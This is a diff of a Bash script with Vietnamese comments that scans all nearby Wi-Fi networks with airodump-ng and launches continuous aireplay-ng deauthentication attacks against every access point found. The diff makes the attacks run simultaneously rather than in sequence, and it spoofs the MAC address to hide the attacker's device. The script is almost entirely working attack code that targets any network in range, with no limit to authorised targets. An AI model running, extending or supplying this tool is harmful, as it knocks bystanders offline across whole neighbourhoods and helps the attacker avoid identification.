@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Cấu hình
-INTERFACE="wlan0" 
+INTERFACE="wlan0"
 MONITOR_INTERFACE="${INTERFACE}mon"
 DURATION=100000
 SCAN_TIME=20
 CSV_FILE="/tmp/scan-01.csv"
 
-# Hàm dọn dẹ
+# Hàm dọn dẹp
 cleanup() {
     echo "Dừng tất cả tiến trình và khôi phục hệ thống..."
     for pid in $pids; do
@@ -16,6 +16,8 @@ cleanup() {
     sleep 1
     echo "Tắt monitor mode cho $MONITOR_INTERFACE..."
     airmon-ng stop "$MONITOR_INTERFACE"
+    echo "Khôi phục địa chỉ MAC ban đầu..."
+    macchanger -p "$INTERFACE" >/dev/null 2>&1
     echo "Khởi động lại NetworkManager..."
     service NetworkManager restart
     echo "Xóa file tạm..."
@@ -36,21 +38,24 @@ fi
 echo "Dừng các tiến trình xung đột..."
 airmon-ng check kill
 
-# Đổi địa chỉ MAC ngẫu nhiên
-echo "Thay đổi địa chỉ MAC cho $INTERFACE..."
-ip link set "$INTERFACE" down
-macchanger -r "$INTERFACE"
-ip link set "$INTERFACE" up
+# Đổi MAC address ngẫu nhiên
+echo "Đổi MAC address ngẫu nhiên cho $INTERFACE..."
+if macchanger -r "$INTERFACE"; then
+    echo "MAC mới đã được thiết lập."
+else
+    echo "[WARNING] Không thể đổi MAC. Tiếp tục..."
+fi
 
 # Chuyển sang monitor mode
 echo "Chuyển $INTERFACE sang monitor mode..."
 airmon-ng start "$INTERFACE"
 if ! iwconfig 2>&1 | grep -q "$MONITOR_INTERFACE"; then
+    echo "[ERROR] Không thể chuyển sang monitor mode. Kiểm tra card mạng."
     cleanup
 fi
 
 # Quét mạng Wi-Fi
-echo "Quét mạng Wi-Fi trong $SCAN_TIME giây (bao gồm 2.4 GHz và 5 GHz)..."
+echo "Quét mạng Wi-Fi trong $SCAN_TIME giây..."
 timeout "$SCAN_TIME" airodump-ng "$MONITOR_INTERFACE" --band abg -w /tmp/scan --output-format csv &
 wait $!
 echo "Quét hoàn tất."
@@ -65,21 +70,21 @@ echo "File CSV: $CSV_FILE đã được tạo."
 # Lọc và đếm số AP
 ap_count=$(grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | wc -l)
 if [[ $ap_count -eq 0 ]]; then
-    echo "[ERROR] File $CSV_FILE không chứa dữ liệu AP."
+    echo "[ERROR] File CSV không chứa dữ liệu AP."
     cleanup
 fi
 echo "Tìm thấy $ap_count mạng Wi-Fi."
 
-# Đọc danh sách AP và tấn công tuần tự
-echo "Bắt đầu tấn công tất cả mạng Wi-Fi... (Nhấn 'q' để dừng)"
+# Tấn công đồng thời tất cả mạng Wi-Fi
+echo "Bắt đầu tấn công tất cả mạng Wi-Fi đồng thời... (Nhấn 'q' để dừng)"
+
 pids=""
 grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | while IFS=, read -r bssid time1 time2 channel speed privacy cipher auth power beacons iv lan idlength essid key; do
     bssid=$(echo "$bssid" | tr -d ' ')
     channel=$(echo "$channel" | tr -d ' ')
     essid=$(echo "$essid" | sed 's/^[[:space:]]*//')
 
-    # Kiểm tra dữ liệu hợp lệ (mở rộng cho 5 GHz: kênh 1-165)
-    if [[ -z "$bssid" || ! "$bssid" =~ ^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$ ]]; then
+    if [[ -z "$bssid" || ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
         echo "[WARNING] BSSID không hợp lệ: $bssid"
         continue
     fi
@@ -92,23 +97,17 @@ grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | while IFS=, read -r bssid time1
     fi
 
     echo "Tấn công \"$essid\" (BSSID: $bssid, Channel: $channel)"
-    # Chuyển kênh bằng iw trên giao diện monitor
-    iw dev "$MONITOR_INTERFACE" set channel "$channel" || {
-        echo "[ERROR] Không thể chuyển sang kênh $channel cho $bssid (có thể driver không hỗ trợ)"
-        # Nếu không chuyển được kênh, thử chạy aireplay-ng trên kênh hiện tại
-        aireplay-ng --deauth 0 -a "$bssid" "$MONITOR_INTERFACE" &
-        pid=$!
-        pids="$pids $pid"
-        sleep 2
-        continue
-    }
-    aireplay-ng --deauth 0 -a "$bssid" "$MONITOR_INTERFACE" &
-    pid=$!
-    pids="$pids $pid"
-    sleep 2  # Đợi 2 giây trước khi tấn công AP tiếp theo
+
+    (
+        iw dev "$MONITOR_INTERFACE" set channel "$channel" || {
+            echo "[ERROR] Không thể chuyển sang kênh $channel"
+        }
+        aireplay-ng --deauth 0 -a "$bssid" "$MONITOR_INTERFACE"
+    ) &
+    pids="$pids $!"
 done
 
-# Chờ và dừng sau 100 giây hoặc khi nhấn 'q'
+# Giữ tiến trình chạy
 echo "Đang tấn công trong $DURATION giây... (Nhấn 'q' để dừng sớm)"
 for ((i=0; i<$DURATION; i++)); do
     read -t 1 -n 1 key
@@ -118,6 +117,5 @@ for ((i=0; i<$DURATION; i++)); do
     fi
 done
 
-# Dừng tấn công sau 100 giây
 echo "Thời gian tấn công kết thúc."
 cleanup
